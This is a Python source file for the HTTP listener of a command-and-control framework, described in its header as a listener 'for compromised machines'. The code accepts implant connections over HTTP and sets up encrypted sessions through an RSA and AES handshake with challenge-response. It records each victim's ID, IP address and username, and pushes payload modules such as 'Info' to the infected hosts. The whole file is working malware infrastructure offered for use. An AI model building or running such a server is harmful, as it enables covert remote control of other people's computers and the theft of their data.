'''
Description: HTTP listener for compromised machines.
Author: iss4cf0ng/ISSAC
Acknowledgement:
    - AES pure implementation: https://github.com/bozhu/AES-Python
'''

import socket
import base64
import threading
import logging
import json

from lib.ColorPrint import ColorPrint as cp
from lib.C2P import C2P
from lib.Client import Client
from lib.ColorPrint import ColorPrint as cp
from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
from lib.Listener import Listener as mainListener
from lib.tool import EZData, EZClass
from lib.EZPayload import get_payload

class Listener:
    log = logging.getLogger(__name__ + '.Listener')
    log.setLevel(logging.NOTSET)

    def __init__(self, ip: str, port: int, main_listener: mainListener):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock = sock
        self.clnt = None

        self.main_listener = main_listener
        
        ip = '0.0.0.0' if ip == '*' else ip

        self.sock.bind((ip, port))
        self.bListen = sock.fileno() != -1
        self.listening = False

        self.msg_handler = None

        self.dic_victim = {}

    def get_victims(self) -> dict:
        return self.dic_victim
    
    def set_msg_handler(self, method: object):
        self.msg_handler = method

    def start(self):
        self.sock.listen(10000)
        self.sock.settimeout(1)
        self.listening = True

        while self.listening:
            try:
                conn, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break # socket closed

            self.log.info(f'New client: ({addr[0]},{addr[1]})')

            t = threading.Thread(target=self.handler, args=[conn, addr, ])
            t.daemon = True

            t.start()
        
        self.log.info('Listener thread exited.')

    def stop(self) -> bool:
        try:
            self.listening = True
            self.sock.close()
            self.log.info(f'Stopped')
            return True
        except Exception as ex:
            self.log.error(str(ex))
            return False

    def send_http_resp(self, szData: str):
        resp = self.get_httpResponse_body(szData)
        self.sock.sendall(resp.encode())

    '''
    victim's message handler.
    '''
    def handler(self, clnt_sock: socket.socket, clnt_addr):

        clnt = Client(clnt_sock)
        clnt.addr = clnt_addr
        clnt.type = 'HTTP'
        self.log.info(f'{clnt.addr}: Type=> {clnt.type}')

        while True:
            try:
                abReq = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                nRecv = len(abReq)
                if not nRecv:
                    continue

                req = abReq.decode()
                headers, body = req.split('\r\n\r\n', 1)

                aHeader = headers.split('\r\n')
                nContentLength = 0

                for szHeaderLine in aHeader:
                    if szHeaderLine.lower().startswith('content-length:'):
                        nContentLength = int(szHeaderLine.split(':')[1].strip())
                        break

                while len(body) < nContentLength:
                    body += clnt_sock.recv(nContentLength - len(body)).decode('utf-8')

                if not body:
                    continue

                # Handler data

                szMethod = aHeader[0].split(' ')[0] # preserved
                szResource = aHeader[0].split(' ')[1] # preserved

                abBody = base64.b64decode(body)
                c2p = C2P(abBuffer=abBody)
                nCmd = c2p.nCmd
                nParam = c2p.nParam
                nLength = c2p.nLength
                abMsg = c2p.get_msg()

                if nCmd == 0:
                    if nParam == 0: # disconnect
                        pass
                    elif nParam == 1: # reconnect.
                        pass

                elif nCmd == 1: # handshaking
                    if nParam == 0:
                        self.log.debug(f'{clnt.addr}: Generating RSA key pair.')

                        n_rsa_keysize = 4096
                        n, e, d, p, q = EZRSA(n_rsa_keysize).generate_rsa_keypair(n_rsa_keysize)
                        xml_PubKey = EZRSA(n_rsa_keysize).encode_public_key(n, e)
                        xml_PrivKey = EZRSA(n_rsa_keysize).encode_private_key(n, e, d, p, q)

                        self.log.debug(f'{clnt.addr}: RSA key pair is generated.')

                        clnt.xml_rsa_pubKey = xml_PubKey
                        clnt.xml_rsa_privKey = xml_PrivKey

                        clnt.http_send(1, 1, Encoder.stre2b64(xml_PubKey))
                    elif nParam == 2:
                        szMsg = abMsg.decode('ascii')
                        split = Encoder.b64d2str(szMsg).split('|')

                        if len(split) == 2:
                            self.log.debug(f'{clnt.addr}: Received encrypted AES key and initial vector')

                            sz_b64_enc_iv = split[0]
                            sz_b64_enc_key = split[1]

                            ab_enc_iv = Encoder.b64str2bytes(sz_b64_enc_iv)
                            ab_enc_key = Encoder.b64str2bytes(sz_b64_enc_key)

                            priv_key = PRSA.xml_to_rsa_key(clnt.xml_rsa_privKey, True)

                            ab_iv = PRSA.rsa_decrypt(ab_enc_iv, priv_key)
                            ab_key = PRSA.rsa_decrypt(ab_enc_key, priv_key)

                            clnt.set_aes(PAES(ab_iv, ab_key))

                            self.log.debug(f'{clnt.addr}: RSA decrypt successfully, the server obtain AES iv and key.')
                            self.log.debug(f'{clnt.addr}: Do challenge and response for verification')
                        
                            clnt.szChallenge = C2P.random_str(100)
                            clnt.http_send(1, 3, clnt.szChallenge)
                        else:
                            self.log.error(f'{clnt.addr}: Invalid data.')
                            self.log.debug(f'{clnt.addr}: Restart key exchange...')

                            clnt.http_send(1, 0)
                    
                    elif nParam == 4:
                        self.log.debug(f"{clnt.addr}: Trying validation...")
                        szCipher = abMsg.decode('utf-8')
                        ab_enc_resp = Encoder.b64str2bytes(szCipher)
                        szPlainResp = clnt.pAES.decrypt_cbc(ab_enc_resp).decode('utf-8')

                        if szPlainResp == clnt.szChallenge:
                            self.log.info(f'{clnt.addr}: Vertification successed.')

                            clnt.http_sendcipher(2, 0, C2P.random_str())
                        else:
                            self.log.error(f'{clnt.addr}: Vertification failed.')

                elif nCmd == 2:
                    cipher = Encoder.b64str2bytes(abMsg.decode('utf-8'))
                    plain = clnt.pAES.decrypt_cbc(cipher)
                    szPlain = plain.decode('utf-8')

                    aMsg = szPlain.split('|')

                    if nParam == 1:
                        self.dic_victim[clnt_addr] = EZClass.Victim(aMsg[0], None, clnt)

                        # pre load payload
                        ls_preload = [
                            'Encoder',
                            'EZData',
                        ]
                        for szName in ls_preload:
                            szPayload = get_payload(self.dic_victim[clnt_addr].szTag, szName)
                            clnt.http_sendvictim(['*', szName, szPayload])

                        ls_send = [
                            '*',
                            'Info',
                            get_payload(self.dic_victim[clnt_addr].szTag, 'Info'),
                            'start',
                        ]

                        clnt.http_sendvictim(ls_send)

                    elif nParam == 3:
                        aMsg = [Encoder.b64d2str(x) for x in aMsg]
                        if aMsg[1] == 'info' and aMsg[2] == 'start':
                            if clnt_addr in self.dic_victim.keys():
                                obj_json = json.loads(aMsg[3])

                                obj_class = self.dic_victim[clnt_addr]
                                
                                if obj_json['ID'] in self.dic_victim.keys():
                                    clnt.close()
                                    break
                                else:
                                    self.dic_victim[obj_json['ID']] = EZClass.Victim(obj_class.szTag, obj_json['ID'], clnt, obj_json['IP'], obj_json['Username'])
                                    self.dic_victim.pop(clnt_addr)
                                    clnt.VictimID = obj_json['ID']

                        # message forwarding, pass message from victim to main listener.
                        if self.listening:
                            self.msg_handler(self.main_listener, self, aMsg[0], clnt, aMsg[1:])

            except Exception as ex:
                clnt_sock.close()
                self.log.error(str(ex))

        self.log.debug(f'Victim offline: {clnt.VictimID}')
        if clnt.VictimID in self.dic_victim.keys():
            self.dic_victim.pop(clnt.VictimID)
            self.main_listener.boardcast_clnt(['disconnect', 'victim', clnt.VictimID])
        
    def get_httpResponse_body(self, szMessage: str) -> str:
        szMessage = Encoder.stre2b64(szMessage)
        nBodySize = len(szMessage)
        szRespHeader = (
            f'HTTP/1.1 200 OK\r\n'
            f'Content-Type: text/plain\r\n'
            f'Content-Length: {nBodySize}\r\n'
            f'\r\n'
        )

        szResp = szRespHeader + szMessage

        return szResp
    
    def get_victims(self) -> dict:
        return self.dic_victim
    
    def set_msg_handler(self, method: object):
        self.msg_handler = method

if __name__ == '__main__':
    pass        